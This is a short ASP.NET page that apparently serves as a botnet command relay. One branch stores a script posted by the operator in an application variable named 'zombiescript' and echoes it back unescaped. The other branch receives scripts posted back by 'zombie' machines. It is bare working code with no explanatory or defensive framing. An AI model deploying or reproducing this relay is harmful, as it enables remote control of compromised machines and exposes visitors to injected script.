<%@ Page Language="C#" %>

<%
    if (Request.QueryString["by"] == "ws")
    {
        string script = Request.Form["txtscript"];
        Application["zombiescript"] = script;
        Response.Write("<fieldset style='border: 3px solid #cccccc;	padding: 5px;font-family: Tahoma, sans-serif;		background-position: bottom right;	background-repeat: no-repeat;'>");
        Response.Write("<legend>Script Posted by Website</legend>");
        string postedscript = Application["zombiescript"].ToString();
        postedscript = postedscript.Replace("\r\n", "<br/>");
        postedscript = postedscript.Replace(" ", "&nbsp;");
        Response.Write(postedscript);
        Response.Write("</fieldset>");
                
    }

    if (Request.QueryString["by"] == "zmb")
    {
        string script = Request.Form["re_txtscript"];
        Application["re_zombiescript"] = script;
        //Response.Write("Script Posted by Zombie:" + Environment.NewLine);
        //Response.Write(Application["re_zombiescript"].ToString());
        Response.StatusCode = (int)System.Net.HttpStatusCode.OK;
        
    }
            
%>


